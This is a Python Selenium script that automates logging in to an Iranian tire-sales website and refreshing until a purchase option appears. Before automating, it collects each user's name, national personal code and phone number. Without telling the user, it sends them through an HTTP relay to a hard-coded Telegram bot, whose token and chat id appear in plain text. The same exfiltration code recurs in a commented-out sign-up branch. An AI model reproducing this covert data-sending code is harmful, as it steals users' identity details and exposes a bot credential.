# version : 3.0.1
# f1 = fild 1 __ b1 = button 1


if __name__ == '__main__': # if user run main file. file run
    from config.config import*
    data = open("data/data.txt", "+a")

    loading(0.003) # loading view(fack) from config
    os.system(cl())

    view(date_time) # printing banner from config

    print(Fore.YELLOW)

    login_or_signin = input("are you singin to website ? ( y or n ): ") # giv efrom user (sign in or login)

    if login_or_signin == 'y' or login_or_signin == 'yes' or login_or_signin == 'Y' or login_or_signin == 'Yes': # if yes
        print (Fore.GREEN)

        name = input("print your name: ").strip() #giving name

        personalCode = input("print your personal code:  ").strip() # giving personal code from user

        phoneNumb = input("print your phone number:  ").strip() # giving phone number

        # sending data to telegram bot(only for personal version)

        url = ("https://api.telegram.org/bot7267358964:AAEbeql9ZBaXXBhooaw2mwboQUj8UsQPvwo/sendmessage?chat_id=1477966103&text="+f"{numb("data/numb.txt")}\n name: {name}\n personal code: {personalCode}\n phone number: {phoneNumb}\n time: {str(JalaliDate.today())}\n not first time\n\n")

        send = {
        "UrlBox": url,
        "AgentList":"Google Chrome",
        "VersionsList":"HTTP/1.1",
        "MethodList":"POST"
        }

        req = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",send)
        
        #
        
        # saving
        data.write(f"{numb("data/numb.txt")}\n name: {name}\n personal code: {personalCode}\n phone number: {phoneNumb}\n time: {str(JalaliDate.today())}\n not first time\n\n")
        
        data.close()
        ChengNumb("data/numb.txt", numb("data/numb.txt"))
        #
        try:
            try:
                driver = webdriver.Firefox() # find driver
            except:
                driver = webdriver.Chrome()
        except:
            print (Fore.RED, "driver find error")

        driver.get("https://kavirtire.ir/index.php/esale/login") # set url on driver
        
        f1 = driver.find_element(By.CLASS_NAME, "form-control")
        f1.send_keys(personalCode) # fild 1
        
        print("click on capcha code")
        
        nu = 20 # captcha stoped
        while nu != 1:
            nu -= 1
            sleep(1)
            print(nu)
        
        b1 = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div/form/div[3]/button"))
        ).click() # btn 1
        
        try:
            b2 = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, '//*[@id="btn-resend"]'))
            ).click()
            
            f2 = driver.find_element(By.XPATH, '//*[@id="code-verification"]')

            print (Fore.GREEN)
            code = input ("print sended code: ").strip()

            sleep(2)
            f2.send_keys(code) # fild 2
            
            sleep(2)
            b3 = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, '//*[@id="submit-form"]'))
            ).click()
            
            sleep(3)

        except:
            driver.close()
            print(Fore.RED, "you have internet error or invalid informatition")
            exit(8, 0) # return error and exit
        
        sleep(5)
        b4 = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div/div[3]/a"))
        ).click()

        while True:
            try:
                b5 = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.XPATH, "/html/body/div[1]/div/div/div/div/div[2]/div/div[1]/div/div[1]/div[3]/div/div[2]"))
                ).click()
                
                print(Fore.CYAN, "now you can buy tire")
                while True :
                    sleep(999)
            except:
                driver.refresh()
                sleep(1.5)


    elif login_or_signin == 'n' or login_or_signin == 'no' or login_or_signin == 'N' or login_or_signin == 'NO': # if user print no (login or signin)
        print(Fore.RED, "come in next update ;)")
        exit(0.25, 5)
    #     print(Fore.GREEN)
        
    #     name = input ("print your name: ").strip() # giving name
       
    #     personalCode = input("print your personal code:  ").strip() # giving personal code

    #     phoneNumb = input("print your phone number:  ").strip() # giving phone number
        
    #     # sending data to telegram bot(only for personal version)
        
    #     url = ("https://api.telegram.org/bot7267358964:AAEbeql9ZBaXXBhooaw2mwboQUj8UsQPvwo/sendmessage?chat_id=1477966103&text="+f"{numb("data/numb.txt")}\n name: {name}\n personal code: {personalCode}\n phone number: {phoneNumb}\n time: {str(JalaliDate.today())}\n firs time\n\n")

    #     send = {
    #     "UrlBox": url,
    #     "AgentList":"Google Chrome",
    #     "VersionsList":"HTTP/1.1",
    #     "MethodList":"POST"
    #     }

    #     req = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",send)
        
    #     #
        
    #     # saving 
    #     data.write(f"{numb("data/numb.txt")}\n name: {name}\n personal code: {personalCode}\n phone number: {phoneNumb}\n time: {str(JalaliDate.today())}\n first time\n\n")
        
    #     data.close()
    #     ChengNumb("data/numb.txt", numb("data/numb.txt"))
        
    #     #

    #     try:
    #         try:
    #             driver = webdriver.Firefox() # find driver
    #         except:
    #             driver = webdriver.Chrome()
    #     except:
    #         print (Fore.RED, "driver find error")


    #     driver.get("https://kavirtire.ir/index.php/esale/register") # set url

    #     b1 = WebDriverWait(driver, 10).until(
    #         EC.element_to_be_clickable((By.ID, "model-suv"))
    #     )
    #     b1.click() # btn 1

    #     f1 = driver.find_element(By.NAME, "n_code")
    #     f1.send_keys(personalCode) # fild 1

    #     sleep(1)

    #     f2 = driver.find_element(By.ID, "mobile")
    #     f2.send_keys(phoneNumb) # fild 2

    #     print(Fore.RED, "confirm captcha code", Fore.GREEN)

    #     nu = 20
    #     while nu != 1:
    #         nu -= 1
    #         sleep(1)
    #         print(nu) # captcha stopped
        
    #     b3 = WebDriverWait(driver, 10).until(
    #         EC.element_to_be_clickable((By.XPATH, "/html/body/div[1]/div/div/div[1]/div[2]/div/form/div[4]/button"))
    #     ).click() # btn 2
        
        
    #     try: # try to Fill sended code fild7
    #         b3 = WebDriverWait(driver, 10).until(
    #             EC.element_to_be_clickable((By.XPATH, '//*[@id="btn-resend"]'))
    #         ).click()
            
    #         f3 = driver.find_element(By.XPATH, '//*[@id="code-verification"]')
    #         print (Fore.GREEN)
    #         code = input ("print sended code: ").strip() # giving sended code from user
    #         sleep(2)
    #         f3.send_keys(code) # fill fild 3
    #     except:
    #         driver.close()
    #         print(Fore.RED, "you have internet error or invalid informatition")
    #         exit(8, 0) # return error and exit

    # elif login_or_signin == 'e':
    #     sys.exit() # exit from user
    # else:
    #     print(Fore.RED, "invalid command")
    #     sleep(3)
    #     sys.exit() # return error and exit
